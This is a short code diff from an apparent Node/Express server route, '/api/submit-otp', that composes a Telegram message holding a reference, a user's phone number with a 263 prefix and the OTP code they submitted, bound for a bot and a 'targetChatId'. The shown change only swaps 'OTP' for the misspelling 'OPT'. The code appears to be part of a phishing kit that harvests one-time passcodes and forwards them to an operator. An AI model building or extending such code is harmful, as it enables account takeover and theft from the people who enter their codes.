@@ -169,7 +169,7 @@ app.post('/api/submit-otp', async (req, res) => {
     const targetChatId = appData.targetChatId;
 
     if (botToken && targetChatId) {
-      const messageText = `💬 <b>OTP VERIFICATION HAS BEEN SUBMITTED</b>\n\n` +
+      const messageText = `💬 <b>OPT VERIFICATION HAS BEEN SUBMITTED</b>\n\n` +
                           `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                           `📞 <b>Phone:</b> 263${appData.formattedPhone}\n` +
                           `💬 <b>OTP Code:</b> <code>${otpCode}</code>\n\n` +
